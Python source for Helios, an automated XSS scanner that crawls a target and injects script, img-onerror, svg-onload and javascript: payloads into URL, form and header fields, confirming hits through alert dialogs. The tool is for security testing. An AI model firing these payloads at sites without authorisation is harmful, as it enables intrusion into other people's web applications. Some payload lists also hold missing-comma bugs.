import argparse
import requests
from bs4 import BeautifulSoup, MarkupResemblesLocatorWarning
import urllib.parse
import uuid
from selenium import webdriver
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.common.keys import Keys
import concurrent.futures
import time
import threading
import shutil
import sys
import re
import os
import random
import string
import warnings
import textwrap

warnings.filterwarnings("ignore", category=MarkupResemblesLocatorWarning)

def banner():
    print(f'''




                                                                                    
 {bcolors.FAIL}∞                                                                         π      ∞ 
   ∞                     ∞                                                      ∞   
     ∞                                       π                                ∞     
      ∞∞            ∞                 ∞                                     ∞∞      
        ∞∞                          ∞∞∞∞∞∞∞∞∞∞∞∞                          ∞∞        
          ∞∞                 ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞                  ∞∞          
            ∞π            ∞∞∞∞∞∞∞∞∞∞∞          ∞∞∞∞∞∞∞∞∞∞∞            ∞∞         ∞  
              ∞ π      ∞∞π∞∞∞∞∞       ∞     π   π    ∞∞∞∞∞π∞∞       ∞∞        π     
   π            ∞   ∞∞∞∞∞∞∞π         πππππ∞ππ ∞   π      ∞∞∞∞∞∞π   ∞                
                  ∞∞∞∞∞∞    ∞    π∞  ππ∞π∞π     ππ∞π        ∞∞∞∞∞∞                  
                ∞∞∞∞∞∞   ∞  ∞ππ ∞        ππ       ∞ ππ∞       ∞∞∞∞∞                 
               ∞∞∞∞∞ ∞∞   πππ∞ ∞      ∞∞∞∞∞∞∞∞∞π     ∞ ∞∞∞   ∞∞ ∞∞∞∞∞    ∞π  ∞      
             π∞∞∞∞    π∞∞π       ∞∞∞∞π∞∞∞∞∞∞∞∞ π∞∞π    π π∞∞∞    π∞∞∞∞        ∞     
            ∞∞∞∞∞      ∞π∞∞    ∞∞∞∞∞  π∞    ∞  ∞∞∞∞∞∞π  π∞∞∞π      ∞∞∞∞π            
           ∞∞∞∞∞  ∞  πππ   ∞∞∞∞∞∞  ∞ ∞ ∞π   ∞ ∞ ∞  ∞π∞∞∞∞π  ∞ ∞     ∞∞∞∞            
          ∞∞∞∞∞     ππ π  ∞ ∞∞∞ ∞∞  ∞π ∞πππ∞∞  ∞  ∞ π∞∞∞      ∞∞     ∞∞∞∞           
          ∞∞∞∞    π ∞ π   ∞∞∞∞∞∞∞ ∞∞ ∞∞ ∞π∞∞π∞∞ ∞∞ ∞∞∞∞∞∞π    π∞∞     ∞∞∞∞          
      π  ∞∞∞∞  π∞ π∞     ∞∞∞∞∞∞π ∞∞ ∞∞∞π∞∞∞∞∞ ∞∞ ∞∞ ∞∞∞ππ∞∞    ππ  π   ∞∞∞∞         
         ∞∞∞π    π∞     ∞  ∞∞∞∞∞∞∞∞ππ∞∞∞∞∞∞∞∞∞∞πππ∞∞∞∞∞∞∞∞∞∞  ∞  π     ∞∞∞∞         
        π∞∞∞      π     ∞∞∞∞     ∞∞π∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞   ∞∞∞∞∞∞    ππ      ∞∞∞         
        ∞∞∞∞     π∞ ∞  ∞∞∞∞∞πππ∞∞∞π∞∞  {bcolors.BOLD}{bcolors.HEADER}HELIOS{bcolors.ENDC}{bcolors.FAIL}  ∞∞ ∞∞∞ππ∞∞∞π∞∞  π  ∞     ∞∞∞∞{bcolors.ENDC}        
 {bcolors.BOLD}∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞ππ   ∞∞∞∞ ∞ππ∞∞{bcolors.BOLD}{bcolors.WARNING}v0.1{bcolors.ENDC}{bcolors.BOLD}ππππ∞π∞∞∞∞   ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞  
        ∞∞∞      ∞π    ∞∞∞∞πππππ∞∞ ∞∞∞∞∞∞∞∞π∞∞∞∞∞ ∞ππ∞∞∞∞∞∞∞∞   π ∞     π∞∞∞        
        ∞∞∞∞     ∞     π∞∞∞π∞∞∞∞∞∞  ππ∞∞∞∞π∞π∞π∞ ∞π∞∞∞∞∞∞∞∞∞∞     ∞     π∞∞∞        
        ∞∞∞∞     π     ∞∞∞∞∞   ∞∞∞∞∞ π∞∞∞∞∞ ∞∞π  ∞∞∞∞   ∞∞∞∞π π   ∞     ∞∞∞∞        
        ∞∞∞∞   π π∞     ∞∞∞∞∞∞∞  ∞∞ ∞ ∞∞∞π π∞∞ ∞∞∞∞ ∞∞∞∞∞∞∞π   π ∞π    ∞∞∞∞         
         ∞∞∞     ∞       ∞∞∞∞∞ ∞∞ ∞∞∞∞ π∞ ππ∞ π∞∞ ∞∞∞π∞∞∞∞∞     ∞∞ π   ∞∞∞∞         
         ∞∞∞∞  π   π      ∞ ∞∞∞ ∞∞∞ ∞ ∞∞∞π∞∞ ∞ ∞∞∞∞ ∞∞∞∞π∞     ππ∞     ∞∞∞          
          ∞∞∞∞  ∞   ∞      ∞∞∞∞∞π∞ ∞∞ ∞π∞∞∞∞π∞∞ ∞∞π ∞∞∞ππ   π  ππ     ∞∞∞∞          
           ∞∞∞∞    π∞∞π   ∞ ∞∞∞∞∞∞∞∞∞π∞ ∞π∞∞∞ ∞ ∞π∞∞∞∞∞∞   π  ∞∞     ∞∞∞∞           
         π  ∞∞∞∞   ∞ ∞ π  ∞    ∞∞∞∞∞∞∞ ∞∞∞∞∞∞ ∞∞∞∞∞π∞   ∞∞  ππ      ∞∞∞∞            
             ∞∞∞∞π     π∞ ∞       ∞∞∞∞∞∞π∞∞∞∞ ∞∞∞∞        ∞∞∞     ∞∞∞∞∞     ∞       
              ∞∞∞∞∞   ∞∞  ∞∞         ∞  ∞∞∞π  ∞         ∞π  π∞   ∞∞π∞∞              
                ∞∞∞∞∞π      π∞π   π      ∞π         ∞ππ ∞     π∞∞∞∞∞                
  ∞    π         π∞∞∞∞∞         π∞π  π∞  π   ∞∞π ∞ π         ∞∞∞∞∞                  
                ∞∞ π∞∞∞∞∞∞         ∞π    ππππ   ∞        π∞∞∞∞∞∞  ∞∞                
              ∞∞      ∞∞∞∞∞∞∞                         π∞∞∞∞∞∞∞      ∞∞              
            ∞∞           ∞∞∞π∞∞∞∞∞∞              ∞∞∞∞∞∞∞∞∞∞           ∞∞            
    π      ∞                π∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞π∞∞∞∞∞∞π                ∞π          
         ∞         ∞∞             ∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞∞              π         ∞π        
       ∞                                            π             ∞         ∞       
     ∞π π                                  ∞                        ∞         ∞     
   ∞π                                                                 π         ∞   
 ∞∞                                                                               ∞{bcolors.ENDC}
                                                                                    
                            {bcolors.BOLD}{bcolors.WARNING}Helios - Automated XSS Scanner{bcolors.ENDC}
                    {bcolors.BOLD}{bcolors.PURPLE}Author: {bcolors.ENDC}{bcolors.BOLD}@stuub   |   {bcolors.BOLD}{bcolors.PURPLE}Github: {bcolors.ENDC}{bcolors.BOLD}https://github.com/stuub



          ''')

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    PARAM = '\033[96m'
    PURPLE = '\033[95m'

class XSSScanner:
    def __init__(self, target_url, browser_type, headless, threads, custom_headers, cookies, output_file, payload_file):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.headers.update(custom_headers)
        self.session.cookies.update(cookies)
        self.verbose = False
        self.browser_type = browser_type
        self.headless = headless
        self.threads = threads
        self.output_file = output_file
        self.payload_file = payload_file
        self.lock = threading.Lock()  
        self.terminal_width = shutil.get_terminal_size().columns
        self.driver = self.setup_driver()
        self.payloads = self.load_payloads()
        self.payload_identifiers = {}
        self.skip_header_scan = False
        self.crawl = False
        self.crawl_depth = 2
        self.scanned_urls = set()
        self.discovered_urls = set()

    
    def cleanup(self):
        if hasattr(self, 'driver') and self.driver:
            self.driver.quit()
        sys.exit(0)

    def setup_driver(self):
        if self.browser_type == 'firefox':
            options = FirefoxOptions()
            if self.headless:
                options.add_argument("--headless")
            driver = webdriver.Firefox(options=options)
        elif self.browser_type == 'chrome':
            options = ChromeOptions()
            if self.headless:
                options.add_argument("--headless")
            driver = webdriver.Chrome(options=options)

        driver.get(self.target_url)
        for name, value in self.session.cookies.items():
            driver.add_cookie({'name': name, 'value': value})

        return driver

    def load_payloads(self):
        if self.payload_file:
            try:
                with open(self.payload_file, 'r') as f:
                    payloads = [line.strip() for line in f if line.strip()]
                self.print_and_save(f"[*] Loaded {len(payloads)} payloads from {self.payload_file}")
                return payloads
            except Exception as e:
                self.print_and_save(f"[!] Error loading payload file: {e}", important=True)
                return self.generate_default_payloads()
        else:
            return self.generate_default_payloads()
        
    def get_payloads(self, injection_type='default'):
        payloads = {
            'default': [
                "<script>alert('XSS_TEST_PAYLOAD')</script>",
                "<img src=x onerror=alert('XSS_TEST_PAYLOAD')>",
                "<svg/onload=alert('XSS_TEST_PAYLOAD')>",
                "javascript:alert('XSS_TEST_PAYLOAD')"
            ],
            'url': [
                "javascript:alert('XSS_TEST_PAYLOAD')",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTX1RFU1RfUEFZTE9BRCcpPC9zY3JpcHQ+",
                "%27%3E%3Cscript%3Ealert(%27XSS_TEST_PAYLOAD%27)%3C/script%3E"
            ],
            'form': [
                "<script>alert('XSS_TEST_PAYLOAD')</script>",
                "'><script>alert('XSS_TEST_PAYLOAD')</script>",
                "\"><script>alert('XSS_TEST_PAYLOAD')</script>",
                "<img src=x onerror=alert('XSS_TEST_PAYLOAD')>"
            ]
        }
        return payloads.get(injection_type, payloads['default'])

    def generate_default_payloads(self):
        return [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')"
            "<sVg/onLOad=document.body.append(`bd0c2517`.repeat(2))>"
        ]

    def customize_payload(self, payload):
        unique_id = uuid.uuid4().hex[:8]
        customized_payload = payload.replace("alert(", f"alert('{unique_id}'+")
        self.payload_identifiers[unique_id] = payload
        return customized_payload

    def print_and_save(self, message, important=False):
        with self.lock:
            # Color the parameter names
            message = self.color_parameters(message)
            
            if important:
                self.print_important(message)
            else:
                self.print_status(message)
            
            if self.output_file:
                # Remove ANSI color codes for file output, looks cool with cat but not kate
                clean_message = self.remove_ansi_codes(message)
                with open(self.output_file, 'a') as f:
                    f.write(clean_message + '\n')

    def color_parameters(self, message):
        # Color parameter names
        return re.sub(r'(parameter:\s*)(\w+)', fr'\1{bcolors.PARAM}\2{bcolors.ENDC}', message)

    def remove_ansi_codes(self, message):
        return re.sub(r'\033\[[0-9;]*m', '', message)

    def print_status(self, message):
        self.terminal_width = shutil.get_terminal_size().columns
        if message.startswith('[*]'):
            colored_message = f"{bcolors.OKBLUE}[*]{bcolors.ENDC} {message[3:]}"
        elif message.startswith('[+]'):
            colored_message = f"{bcolors.OKGREEN}[+]{bcolors.ENDC} {message[3:]}"
        elif message.startswith('[!]'):
            colored_message = f"{bcolors.FAIL}[!]{bcolors.ENDC} {message[3:]}"
        else:
            colored_message = message

        wrapped_message = textwrap.fill(colored_message, self.terminal_width - 1)
        sys.stdout.write("\r" + " " * self.terminal_width + "\r")
        sys.stdout.write(wrapped_message + "\n")
        sys.stdout.flush()

    def print_important(self, message):
        self.terminal_width = shutil.get_terminal_size().columns
        if message.startswith('[*]'):
            colored_message = f"{bcolors.OKBLUE}[*]{bcolors.ENDC} {message[3:]}"
        elif message.startswith('[+]'):
            colored_message = f"{bcolors.OKGREEN}[+]{bcolors.ENDC} {message[3:]}"
        elif message.startswith('[!]'):
            colored_message = f"{bcolors.FAIL}[!]{bcolors.ENDC} {message[3:]}"
        else:
            colored_message = message

        wrapped_message = textwrap.fill(colored_message, self.terminal_width - 1)
        sys.stdout.write("\r" + " " * self.terminal_width + "\r")
        print(wrapped_message)
        sys.stdout.flush()

    def scan_url_parameters(self):
        parsed_url = urllib.parse.urlparse(self.target_url)
        params = urllib.parse.parse_qs(parsed_url.query)
        
        for param, value in params.items():
            for payload in self.payloads:
                test_url = self.target_url.replace(f"{param}={value[0]}", f"{param}={urllib.parse.quote(payload)}")
                self.print_and_save(f"[*] Testing URL parameter: {param} with payload: {bcolors.WARNING}{payload}{bcolors.ENDC}")
                if self.test_payload(payload, test_url, "GET"):
                    self.print_and_save(f"[+] XSS vulnerability confirmed in URL parameter: {param}", important=True)

    def scan_dom_content(self):
        self.print_and_save("[*] Scanning for DOM-based XSS vulnerabilities")
        response = self.session.get(self.target_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Extract all script contents (inline & external)
        scripts = soup.find_all('script')
        for script in scripts:
            if script.get('src'):
                # External script content
                script_url = urllib.parse.urljoin(self.target_url, script['src'])
                self.print_and_save(f"[*] Analyzing external script: {script_url}")
                script_content = self.fetch_external_script(script_url)
                if script_content:
                    self.test_dom_xss(script_content, is_external=True, script_url=script_url)
            elif script.string:
                # Inline script content
                self.test_dom_xss(script.string)

        # Check for event handlers in HTML elements
        for tag in soup.find_all(True):
            for attr in tag.attrs:
                if attr.lower().startswith('on'):
                    self.test_dom_xss(tag[attr])

    def fetch_external_script(self, url):
        try:
            response = self.session.get(url)
            return response.text
        except Exception as e:
            self.print_and_save(f"[!] Error fetching external script {url}: {str(e)}", important=True)
            return None

    def scan_headers(self):
        headers_to_test = ['User-Agent', 'Referer', 'X-Forwarded-For']
        
        for header in headers_to_test:
            for payload in self.payloads:
                self.print_and_save(f"[*] Testing header: {header} with payload: {bcolors.WARNING}{payload}{bcolors.ENDC}")
                test_headers = {header: payload}
                if self.test_payload(payload, self.target_url, "GET", headers=test_headers):
                    self.print_and_save(f"[+] XSS vulnerability confirmed in header: {header}", important=True)

    def scan_post_parameters(self):
        response = self.session.get(self.target_url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')

        for form_index, form in enumerate(forms):
            action = form.get('action', self.target_url)
            if not action.startswith(('http://', 'https://')):
                action = urllib.parse.urljoin(self.target_url, action)

            method = form.get('method', 'get').lower()
            if method != 'post':
                continue

            inputs = form.find_all('input')
            textareas = form.find_all('textarea')
            selects = form.find_all('select')

            params = {}
            for input_field in inputs + textareas + selects:
                name = input_field.get('name')
                if name:
                    params[name] = ''

            self.print_and_save(f"[*] Testing POST form {form_index + 1} with {len(params)} parameters")
            self.test_post_params(action, params)

    def test_post_params(self, url, params):
        for param in params:
            for payload in self.payloads:
                self.print_and_save(f"[*] Testing POST parameter: {param} with payload: {bcolors.WARNING}{payload}{bcolors.ENDC}")
                test_params = params.copy()
                test_params[param] = payload
                if self.test_payload(payload, url, "POST", data=test_params):
                    self.print_and_save(f"[+] XSS vulnerability confirmed in {bcolors.BOLD}POST{bcolors.ENDC} parameter: {param}", important=True)
                    # self.print_and_save(f"[*] Successful exploit URL: {url}\n {payload} in param {param}", important=True)
                    self.print_and_save(f"{bcolors.BOLD}Test Payload: {bcolors.OKGREEN}{payload}{bcolors.ENDC}", important=True)
                    self.print_and_save(f"{bcolors.BOLD}Test URL: {bcolors.OKGREEN}{url}{bcolors.ENDC}", important=True)
                    self.print_and_save(f"{bcolors.BOLD}Test Parameter: {bcolors.OKGREEN}{param}{bcolors.ENDC}", important=True)

    def test_payload(self, payload, url, method, headers=None, data=None):
        original_payload = payload
        payload = self.customize_payload(payload)
        try:
            if method == "GET":
                self.driver.get(url.replace(original_payload, payload))
            elif method == "POST":
                self.driver.get(url)
                for name, value in data.items():
                    try:
                        element = self.driver.find_element(By.NAME, name)
                        element.clear()
                        element.send_keys(value.replace(original_payload, payload) if value == original_payload else value)
                    except:
                        if self.verbose:
                            self.print_and_save(f"[!] Could not find input field: {name}", important=True)
                
                try:
                    submit_button = self.driver.find_element(By.XPATH, "//input[@type='submit']")
                    submit_button.click()
                except:
                    if self.verbose:
                        self.print_and_save("[!] Could not find submit button, pressing Enter on last input field", important=True)
                    element.send_keys(Keys.ENTER)

            try:
                WebDriverWait(self.driver, 3).until(EC.alert_is_present())
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                alert.accept()
                for unique_id, orig_payload in self.payload_identifiers.items():
                    if unique_id in alert_text:
                        self.print_and_save(f"[+] XSS vulnerability confirmed: {bcolors.WARNING}{orig_payload}{bcolors.ENDC}", important=True)
                        return True
            except TimeoutException:
                pass

            if payload in self.driver.page_source:
                if self.verbose:
                    self.print_and_save(f"[*] Payload reflected but not executed: {bcolors.WARNING}{original_payload}{bcolors.ENDC}", important=True)

        except Exception as e:
            if self.verbose:
                self.print_and_save(f"[!] Error testing payload: {e}", important=True)
        return False

    def test_dom_xss(self, content, is_external=False, script_url=None):
        sources = [
            "document.URL", "document.documentURI", "document.URLUnencoded", "document.baseURI",
            "location", "document.cookie", "document.referrer", "window.name",
            "history.pushState", "history.replaceState", "localStorage", "sessionStorage",
            "IndexedDB", "WebSQL", "FileSystem"
        ]
        sinks = [
            "eval", "setTimeout", "setInterval", "setImmediate", "execScript",
            "crypto.generateCRMFRequest", "ScriptElement.src", "ScriptElement.text",
            "ScriptElement.textContent", "ScriptElement.innerText",
            "anyTag.onEventName", "range.createContextualFragment",
            "crypto.generateCRMFRequest", "HTMLElement.innerHTML",
            "Document.write", "Document.writeln"
        ]

        # Check specifically for eval
        if re.search(r'eval\s*\(', content, re.IGNORECASE):
            self.print_and_save(f"[!] Potential eval-based DOM XSS vulnerability found", important=True)
            exploit_info = self.confirm_dom_xss("user input", "eval", is_external, script_url)
            if exploit_info:
                self.print_and_save(f"[+] eval-based DOM XSS vulnerability confirmed", important=True)
                self.print_and_save(f"[*] Exploit Information:\n{exploit_info}", important=True)
                return True

        for source in sources:
            for sink in sinks:
                pattern = re.compile(r'{}.*?{}'.format(re.escape(source), re.escape(sink)), re.IGNORECASE | re.DOTALL)
                if pattern.search(content):
                    location = "an external script" if is_external else "an inline script"
                    self.print_and_save(f"[!] Potential DOM XSS found in {location}: {source} flowing into {sink}", important=True)
                    if is_external:
                        self.print_and_save(f"   Script URL: {script_url}")
                    
                    exploit_info = self.confirm_dom_xss(source, sink, is_external, script_url)
                    if exploit_info:
                        self.print_and_save(f"[+] DOM XSS vulnerability confirmed: {source} into {sink}", important=True)
                        self.print_and_save(f"[*] Exploit Information:\n{exploit_info}", important=True)
                        return True

        # Check for other vulnerable patterns
        vulnerable_patterns = [
            (r'document\.write\s*\(\s*.*\)', "document.write"),
            (r'\.innerHTML\s*=\s*.*', "innerHTML"),
            (r'\.outerHTML\s*=\s*.*', "outerHTML"),
            (r'\.insertAdjacentHTML\s*\(.*\)', "insertAdjacentHTML"),
            (r'execScript\s*\(.*\)', "execScript"),
            (r'setTimeout\s*\(.*\)', "setTimeout"),
            (r'setInterval\s*\(.*\)', "setInterval"),
        ]

        for pattern, func_name in vulnerable_patterns:
            if re.search(pattern, content, re.IGNORECASE):
                location = "an external script" if is_external else "an inline script"
                self.print_and_save(f"[!] Potential DOM XSS vulnerability found in {location}: {func_name}", important=True)
                if is_external:
                    self.print_and_save(f"   Script URL: {script_url}")
                
                exploit_info = self.confirm_dom_xss(func_name, func_name, is_external, script_url)
                if exploit_info:
                    self.print_and_save(f"[+] DOM XSS vulnerability confirmed: {func_name}", important=True)
                    self.print_and_save(f"[*] Exploit Information:\n{exploit_info}", important=True)
                    return True

        return False

    def confirm_dom_xss(self, source, sink, is_external=False, script_url=None):
        context_payloads = {
            "innerHTML": [
                "<img src=x onerror=alert('XSS_TEST_PAYLOAD')>",
                "<svg><script>alert('XSS_TEST_PAYLOAD')</script></svg>"
                "<svg/onload=alert('XSS_TEST_PAYLOAD')>",
                "<script>alert(XSS_TEST_PAYLOAD)</script>"
            ],
            "eval": [
                "alert('XSS_TEST_PAYLOAD')",
                "'-alert('XSS_TEST_PAYLOAD')-'",
                "'-alert('XSS_TEST_PAYLOAD')//",
                "alert('XSS_TEST_PAYLOAD')//",
                "\"-alert('XSS_TEST_PAYLOAD')-\"",
                "\";alert('XSS_TEST_PAYLOAD');//"
            ],
            "document.write": [
                "<script>alert('XSS_TEST_PAYLOAD')</script>",
                "<img src=x onerror=alert('XSS_TEST_PAYLOAD')>"
                "<script>alert(XSS_TEST_PAYLOAD)</script>",
                "javascript:alert('XSS_TEST_PAYLOAD')"
            ],
            "default": [
                "<script>alert('XSS_TEST_PAYLOAD')</script>",
                "javascript:alert('XSS_TEST_PAYLOAD')",
                "<img src=x onerror=alert('XSS_TEST_PAYLOAD')>",
                "<svg/onload=alert('XSS_TEST_PAYLOAD')>",
                "<script>alert(XSS_TEST_PAYLOAD)</script>"

            ]
        }

        payloads = context_payloads.get(sink.lower(), context_payloads["default"])
    
        # Parse the original URL
        parsed_url = urllib.parse.urlparse(self.target_url)
        query = parsed_url.query
        
        # Handle the case where there's a parameter without a key
        if '=' not in query and query:
            original_param = query
            existing_params = {}
        else:
            existing_params = urllib.parse.parse_qs(query)
            original_param = None
        
        for payload in payloads:
            encoded_payload = urllib.parse.quote(payload)
            
            # If there was an original parameter without a key, test it first
            if original_param:
                test_query = f"{original_param}{encoded_payload}"
                test_url = urllib.parse.urlunparse(parsed_url._replace(query=test_query))
                
                self.print_and_save(f"[*] Testing URL: {test_url}", important=True)
                
                if self.test_single_payload(test_url, payload):
                    return self.generate_exploit_info(source, sink, payload, test_url, is_external, script_url)
            
            # Try injecting the payload into each existing parameter
            for param, values in existing_params.items():
                test_params = existing_params.copy()
                test_params[param] = [f"{values[0]}{encoded_payload}"]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                if original_param:
                    test_query = f"{original_param}&{test_query}"
                test_url = urllib.parse.urlunparse(parsed_url._replace(query=test_query))
                
                self.print_and_save(f"[*] Testing URL: {test_url}", important=True)
                
                if self.test_single_payload(test_url, payload):
                    return self.generate_exploit_info(source, sink, payload, test_url, is_external, script_url)
            
            # Try adding new parameters with different names
            new_param_names = ['input', 'data', 'value', 'param', self.generate_random_param()]
            for new_param in new_param_names:
                test_params = existing_params.copy()
                test_params[new_param] = [encoded_payload]
                test_query = urllib.parse.urlencode(test_params, doseq=True)
                if original_param:
                    test_query = f"{original_param}&{test_query}"
                test_url = urllib.parse.urlunparse(parsed_url._replace(query=test_query))
                
                self.print_and_save(f"[*] Testing URL with new parameter '{new_param}': {test_url}", important=True)
                
                if self.test_single_payload(test_url, payload):
                    return self.generate_exploit_info(source, sink, payload, test_url, is_external, script_url)

        return None
    
    def generate_random_param(self, length=8):
        """Generate a random parameter name."""
        return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
    
    def test_single_payload(self, test_url, payload):
        self.driver.get(test_url)
        return self.check_exploitation(payload)
    
    def check_exploitation(self, payload):
        # Check for alert
        try:
            WebDriverWait(self.driver, 3).until(EC.alert_is_present())
            alert = self.driver.switch_to.alert
            alert_text = alert.text
            alert.accept()
            if "XSS_TEST_PAYLOAD" in alert_text:
                self.print_and_save(f"[+] XSS Confirmed: Alert triggered with payload {payload}" , important=True)
                return True
        except TimeoutException:
            pass

        # Check for DOM modifications
        try:
            WebDriverWait(self.driver, 3).until(
                EC.presence_of_element_located((By.XPATH, "//*[contains(text(), 'XSS_TEST_PAYLOAD')]"))
            )
            self.print_and_save(f"[+] XSS Confirmed: Payload found in DOM", important=True)
            return True
        except TimeoutException:
            pass

        # Check if the payload is in the page source (might be reflected but not executed)
        page_source = self.driver.page_source
        if "XSS_TEST_PAYLOAD" in page_source:
            self.print_and_save(f"[*] Payload reflected in page source: {payload}", important=True)
            # unconfirmed xss, just reflection
            return False

        return False

    def generate_exploit_info(self, source, sink, payload, test_url, is_external=False, script_url=None, executed=True):
        exploit_info = f"Vulnerable Source: {source}\n"
        exploit_info += f"Vulnerable Sink: {sink}\n"
        exploit_info += f"Test Payload: {payload}\n"
        exploit_info += f"Test URL: {test_url}\n"
        
        if is_external:
            exploit_info += f"Vulnerable Script: {script_url}\n"
        
        if executed:
            exploit_info += "Status: Payload was successfully executed\n"
        else:
            exploit_info += "Status: Payload was reflected but not executed\n"

        return exploit_info
    
    def run_scan(self):
        self.print_and_save(f"[*] Starting XSS scan on {self.target_url}")
        start_time = time.time()

        if self.crawl:
            self.crawl_website(self.target_url, self.crawl_depth)
            self.print_and_save(f"[*] Crawling complete. Discovered {len(self.discovered_urls)} URLs.")
        else:
            self.discovered_urls.add(self.target_url)

        for url in self.discovered_urls:
            self.print_and_save(f"[*] Scanning URL: {url}")
            self.scan_single_url(url)

        end_time = time.time()
        self.print_and_save(f"[+] Scan complete. Time taken: {end_time - start_time:.2f} seconds", important=True)
        
        if self.output_file:
            self.print_and_save(f"[+] Results saved to {self.output_file}", important=True)
        
        self.cleanup()

    def scan_single_url(self, url):
        self.target_url = url
        self.print_and_save(f"[*] Testing URL parameters for: {url}")
        self.scan_url_parameters()
        
        self.print_and_save(f"[*] Scanning DOM content for: {url}")
        self.scan_dom_content()

        self.print_and_save(f"[*] Testing POST parameters for: {url}")
        self.scan_post_parameters()

        if not self.skip_header_scan:
            self.print_and_save(f"[*] Testing headers for: {url}")
            self.scan_headers()

    def crawl_website(self, url, depth):
        if depth == 0 or url in self.scanned_urls:
            return

        self.scanned_urls.add(url)
        self.discovered_urls.add(url)
        self.print_and_save(f"[*] Crawling: {url}")

        try:
            response = requests.get(url)
            soup = BeautifulSoup(response.text, 'html.parser')
            if soup is None:
                return
            
            for link in soup.find_all('a', href=True):
                next_url = urllib.parse.urljoin(url, link['href'])
                parsed_next_url = urllib.parse.urlparse(next_url)
                parsed_target_url = urllib.parse.urlparse(self.target_url)
                
                if (parsed_next_url.netloc == parsed_target_url.netloc and 
                    parsed_next_url.scheme == parsed_target_url.scheme):
                    self.crawl_website(next_url, depth - 1)
        except Exception as e:
            self.print_and_save(f"[!] Error crawling {url}: {str(e)}", important=True)

def main():
    parser = argparse.ArgumentParser(description="XSS Scanner")
    parser.add_argument("target", nargs='?', help="Target URL to scan")
    parser.add_argument("-l", "--target-list", help="File containing list of target URLs")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("--browser", choices=['firefox', 'chrome'], default='firefox', help="Choose browser driver (default: firefox)")
    parser.add_argument("--headless", action="store_true", help="Run browser in headless mode")
    parser.add_argument("--threads", type=int, default=10, help="Number of concurrent threads (default: 4)")
    parser.add_argument("--headers", nargs='+', help="Custom headers in the format 'Name:Value'")
    parser.add_argument("--cookies", nargs='+', help="Cookies in the format 'Name=Value'")
    parser.add_argument("-o", "--output", help="Output file to write results")
    parser.add_argument("--payload-file", help="File containing custom XSS payloads")
    parser.add_argument("--scan-headers", action="store_true", help="Enable header scanning")
    parser.add_argument("--crawl", action="store_true", help="Enable crawling of the target website")
    parser.add_argument("--crawl-depth", type=int, default=2, help="Depth of crawling (default: 2)")
    args = parser.parse_args()

    if not args.target and not args.target_list:
        parser.error("Either a target URL or a target list file must be provided.")

    custom_headers = {}
    if args.headers:
        for header in args.headers:
            name, value = header.split(':', 1)
            custom_headers[name.strip()] = value.strip()

    cookies = {}
    if args.cookies:
        for cookie in args.cookies:
            name, value = cookie.split('=', 1)
            cookies[name.strip()] = value.strip()

    targets = []
    if args.target is not None:
        print(f"[*] Target URL: {args.target}\n")
    if args.target_list:
        with open(args.target_list, 'r') as f:
            targets = [line.strip() for line in f if line.strip()]
            print(f"[*] Loaded {len(targets)} target URLs from {args.target_list}")
    elif args.target:
        targets = [args.target]

    for target in targets:
        scanner = XSSScanner(target, args.browser, args.headless, args.threads, 
                             custom_headers, cookies, args.output, args.payload_file)
        scanner.verbose = args.verbose
        scanner.skip_header_scan = not args.scan_headers
        scanner.crawl = args.crawl
        scanner.crawl_depth = args.crawl_depth

        try:
            scanner.run_scan()
        except KeyboardInterrupt:
            scanner.print_and_save("[!] Scan interrupted by user. Exiting...", important=True)
            scanner.cleanup()
        except Exception as e:
            print(f"\n[!] An unexpected error occurred: {str(e)}")
            scanner.print_and_save(f"[!] Scan error: {str(e)}", important=True)
            scanner.cleanup()
        finally:
            print(f"{bcolors.BOLD}[!]{bcolors.ENDC}  Helios has concluded testing {target}.")

    print("All scans completed. Thank you for using the tool.")


if __name__ == "__main__":
    banner()
    main()